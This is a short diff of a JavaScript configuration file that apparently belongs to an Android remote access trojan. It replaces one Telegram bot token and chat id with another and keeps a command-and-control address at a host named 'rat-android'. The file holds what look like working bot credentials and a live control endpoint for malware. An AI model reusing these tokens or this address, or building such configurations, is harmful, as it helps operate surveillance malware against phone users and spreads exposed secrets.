@@ -1,5 +1,5 @@
 module.exports = {
-  token: "7135436679:AAEGDNje8IldgMYQg4tIv4z6nxmRouuGUQw",
-  id:"7135436679",
+  token: "7912402132:AAGpe9dTaYLONp5Jx73aQvtC0zjChU9elcc",
+  id:"6919638073",
   address:"http://rat-android-7dnf.onrender.com"
 };
